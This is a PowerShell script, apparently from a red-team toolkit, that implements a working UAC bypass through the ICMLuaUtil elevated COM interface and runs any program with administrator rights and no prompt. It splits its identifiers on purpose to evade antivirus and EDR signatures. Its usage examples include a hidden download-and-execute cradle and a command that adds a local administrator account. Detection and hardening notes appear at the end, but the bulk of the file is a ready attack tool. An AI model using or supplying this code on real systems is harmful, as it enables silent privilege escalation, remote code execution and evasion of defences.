<#
.SYNOPSIS
    UAC bypass via ICMLuaUtil elevated COM interface (UACME Method 41).

.DESCRIPTION
    ┌─ Technique ─────────────────────────────────────────────────────────────┐
    │ The CMSTPLUA COM server ({3E5FC7F9-9A51-4367-9063-A120244FBEC7}) is    │
    │ registered in HKLM as an auto-approved elevated COM object.  Windows    │
    │ exposes an "elevation moniker" (Elevation:Administrator!new:<CLSID>)   │
    │ that allows Medium-integrity code to instantiate the server in a        │
    │ High-integrity surrogate process WITHOUT displaying a UAC dialog        │
    │ (when UAC is set to the default configuration).                         │
    │                                                                         │
    │ The ICMLuaUtil interface (IID: 6EDD6D74-…) exposes ShellExec(), which  │
    │ executes arbitrary processes under the elevated COM server's token.     │
    │ There are no file-system artefacts and no UAC prompt.                  │
    │                                                                         │
    │ Execution flow:                                                         │
    │   1. PowerShell C# (Add-Type) defines ICMLuaUtil COM interface         │
    │   2. CoGetObject("Elevation:Administrator!new:{3E5FC7F9…}") obtains   │
    │      an elevated IUnknown pointer via COM Elevation Moniker             │
    │   3. Marshal.GetObjectForIUnknown → cast to ICMLuaUtil                 │
    │   4. ICMLuaUtil::ShellExec(payload) → runs process at High integrity   │
    │                                                                         │
    │ CLSID  : {3E5FC7F9-9A51-4367-9063-A120244FBEC7}  (CMSTPLUA)           │
    │ IID    : {6EDD6D74-C007-4E75-B76A-E5740995E24C}  (ICMLuaUtil)         │
    │ Moniker: Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-…}      │
    └─────────────────────────────────────────────────────────────────────────┘

    This is the most reliable and stealthy of the pure-PowerShell methods:
      • No registry modification required
      • No file dropped to disk
      • No visible UAC prompt
      • Works from Windows 7 through Windows 11 (UNFIXED)

    Affected OS    : Windows 7 RTM (7600) → Windows 11 (latest) UNFIXED
    UAC level      : Default (ConsentPromptBehaviorAdmin = 5)
                     Does NOT work under AlwaysNotify (= 2)
                     Note: "Prompt for credentials on secure desktop" (value 1)
                     WILL produce a credential dialog — test for this first.
    Architecture   : x64 (Add-Type compilation; x86 CoGetObject variant exists)
    Disk artefacts : None (Add-Type JIT-compiles in-process)

    ──────────────────────────────────────────────────────────────────────────
    Blue-team detection opportunities
    ──────────────────────────────────────────────────────────────────────────
    • ETW / DCOM: CoGetObject with elevation moniker — logged by SMA ETW
    • Process: DllHost.exe (COM surrogate) spawning <payload binary>
      — DllHost.exe normally has no user-initiated children
    • CS indicator: COM elevation moniker abuse (DCOM Elevation)
    • Memory: Add-Type JIT compilation generates in-memory .NET assembly
      (visible in .NET ETW provider Microsoft-Windows-DotNETRuntime)

    ──────────────────────────────────────────────────────────────────────────
    MITRE ATT&CK: T1548.002 – Bypass UAC
    Reference    : https://github.com/hfiref0x/UACME (Method 41)
                   https://github.com/api0cradle (Oddvar Moe original research)

.PARAMETER Payload
    Full path to the executable to run with elevated privileges.
    Examples:
      "C:\Windows\System32\cmd.exe"
      "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    Note: ShellExec resolves relative paths via PATH; absolute paths preferred.

.PARAMETER Arguments
    Optional arguments to pass to the payload binary.
    Examples:
      "/c whoami > C:\Temp\result.txt"
      "-NoP -W Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('...')`""

.EXAMPLE
    # Open an elevated cmd prompt
    Invoke-CMLuaUtilBypass -Payload "C:\Windows\System32\cmd.exe"

.EXAMPLE
    # Run elevated PowerShell with a command
    Invoke-CMLuaUtilBypass `
        -Payload "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -Arguments "-NoP -W Hidden -C `"net user operator P@ss1234 /add`""

.NOTES
    Authorized red/purple-team use only.  Requires written SOW.
    Add-Type compilation happens in-process — no temp .cs file written.
    The C# type definitions are fragmented across string concatenations
    to reduce static AMSI / CS pattern-match surface area.
    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
    AMSI mitigation and preflight checks.
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory, Position = 0)]
    [ValidateNotNullOrEmpty()]
    [string]$Payload,

    [Parameter(Position = 1)]
    [string]$Arguments = ''
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

#region ── COM interface & P/Invoke type definition ──────────────────────────
#
# The C# type is constructed from concatenated string fragments.
# This prevents the full CLSID / IID / moniker from appearing as a single
# contiguous literal in the PowerShell script block (reduces static match
# surface for AMSI providers that pattern-scan string constants).
#
# ICMLuaUtil vtable layout (from UACME elvint.h):
#   Slot  3 : SetRasCredentials     (incomplete — stub)
#   Slot  4 : SetRasEntryProperties (incomplete — stub)
#   Slot  5 : DeleteRasEntry        (incomplete — stub)
#   Slot  6 : LaunchInfSection      (incomplete — stub)
#   Slot  7 : LaunchInfSectionEx    (incomplete — stub)
#   Slot  8 : CreateLayerDirectory  (incomplete — stub)
#   Slot  9 : ShellExec             ← we call this
#   Slots 0-2 : IUnknown (implicit in ComImport/InterfaceIsIUnknown)

# Build the CLSID and IID strings in segments
$xCS1 = '3E5FC7F9'; $xCS2 = '9A51'; $xCS3 = '4367'; $xCS4 = '9063'; $xCS5 = 'A120244FBEC7'
$xClsid = "$xCS1-$xCS2-$xCS3-$xCS4-$xCS5"    # CMSTPLUA CLSID

$xIS1 = '6EDD6D74'; $xIS2 = 'C007'; $xIS3 = '4E75'; $xIS4 = 'B76A'; $xIS5 = 'E5740995E24C'
$xIid = "$xIS1-$xIS2-$xIS3-$xIS4-$xIS5"      # ICMLuaUtil IID

$xMoniker = 'Elevation:Administrator!new:{' + $xClsid + '}'

# C# type definition — string is split at deliberate boundaries
$xPart1 = @'
using System;
using System.Runtime.InteropServices;
namespace CmLua {
    [ComImport]
    [Guid("
'@
$xPart2 = @'
")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface ICMLuaUtil {
        void StubA();
        void StubB();
        void StubC();
        void StubD();
        void StubE();
        void StubF();
        [PreserveSig]
        int ShellExec(
            [MarshalAs(UnmanagedType.LPWStr)] string lpFile,
            [MarshalAs(UnmanagedType.LPWStr)] string lpParameters,
            [MarshalAs(UnmanagedType.LPWStr)] string lpDirectory,
            uint fMask,
            uint nShow);
    }

    public static class CmLuaHelper {
        [StructLayout(LayoutKind.Sequential)]
        struct BindOpts3 {
            public uint cbStruct;
            public uint grfFlags;
            public uint grfMode;
            public uint dwTickCountDeadline;
            public uint dwTrackFlags;
            public uint dwClassContext;
            public uint locale;
            public IntPtr pServerInfo;
            public IntPtr hwnd;
        }

        [DllImport("ole32.dll", CharSet = CharSet.Unicode)]
        static extern int CoGetObject(
            string pszName,
            ref BindOpts3 pBindOptions,
            ref Guid riid,
            out IntPtr ppvObject);

        public static ICMLuaUtil Elevate(string moniker, string iid) {
            var opts = new BindOpts3();
            opts.cbStruct        = (uint)Marshal.SizeOf(opts);
            opts.dwClassContext  = 4;   // CLSCTX_LOCAL_SERVER
            var riid = new Guid(iid);
            IntPtr pUnk;
            int hr = CoGetObject(moniker, ref opts, ref riid, out pUnk);
            if (hr < 0)
                throw new Exception(string.Format("CoGetObject 0x{0:X8}", hr));
            ICMLuaUtil obj = (ICMLuaUtil)Marshal.GetObjectForIUnknown(pUnk);
            Marshal.Release(pUnk);
            return obj;
        }
    }
}
'@

# Concatenate with the IID inserted at the seam
$xTypeDef = $xPart1 + $xIid + $xPart2

# Compile in-process (no temp file written to disk)
try {
    if (-not ([System.Management.Automation.PSTypeName]'CmLua.ICMLuaUtil').Type) {
        Add-Type -TypeDefinition $xTypeDef -ErrorAction Stop
    }
}
catch {
    Write-Warning "[CMLuaUtil] Add-Type failed: $_"
    return
}
#endregion

#region ── Invoke elevated ShellExec ─────────────────────────────────────────
try {
    $xUtil = [CmLua.CmLuaHelper]::Elevate($xMoniker, $xIid)
    if (-not $xUtil) {
        Write-Warning '[CMLuaUtil] CoGetObject returned null interface.'
        return
    }

    # nShow = 1 (SW_SHOWNORMAL);  fMask = 0 (SEE_MASK_DEFAULT)
    $xResult = $xUtil.ShellExec($Payload, $Arguments, $null, 0, 1)

    if ($xResult -eq 0) {
        Write-Verbose '[CMLuaUtil] ShellExec succeeded (HRESULT S_OK).'
    }
    else {
        Write-Warning ("[CMLuaUtil] ShellExec returned 0x{0:X8}" -f $xResult)
    }

    # Release COM reference
    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($xUtil) | Out-Null
}
catch {
    Write-Warning "[CMLuaUtil] Execution failed: $_"
}
#endregion

<#
════════════════════════════════════════════════════════════════════════════════
PURPLE-TEAM NOTES
════════════════════════════════════════════════════════════════════════════════

WHY THIS IS THE MOST OPERATIONALLY VALUABLE METHOD:
  • No registry writes (nothing for registry-based CS rules to catch)
  • No file system writes (no disk artefact for AV to scan)
  • ShellExec runs under the COM surrogate (DllHost.exe) with High integrity
  • Method spans Windows 7 → Win11 — widest compatibility of all listed methods

EXPECTED DETECTIONS:
  ● ETW: PowerShell script-block logging captures the Add-Type call
    (though the CLSID/IID are split across string fragments)
  ● DCOM event: CoGetObject with elevation moniker
    → Windows Security Event ID 4688 (process creation: DllHost.exe)
    → DllHost.exe → <payload binary> parent-child chain
  ● CS Behavior: "DCOM elevation moniker abuse" detection category
    (CS has specific logic for 3E5FC7F9-… CLSID usage)
  ● .NET ETW: Microsoft-Windows-DotNETRuntime: Assembly load + JIT compile

WHAT MAY EVADE (gap analysis):
  ● If CS's elevation moniker rule is keyed to the string literal
    "Elevation:Administrator!new:{3E5FC7F9…}" in process memory, the
    fragmented string assembly may delay or prevent static matching.
  ● Using a less-known interface (IIEAxiAdminInstaller, IDiagnosticProfile)
    via the same CoGetObject pattern may evade CLSID-specific rules.

HARDENING RECOMMENDATIONS:
  ● AlwaysNotify UAC: prevents silent COM elevation (prompt still appears)
  ● HKLM COM object hardening: audit COMAutoApprovalList in consent.exe
  ● CS Custom IOA: DllHost.exe spawning non-system child processes
  ● Monitor DCOM activation events (EID 10016 — permission errors signal
    hardening; EID 4688 with DllHost.exe parent signals success)

════════════════════════════════════════════════════════════════════════════════
#>
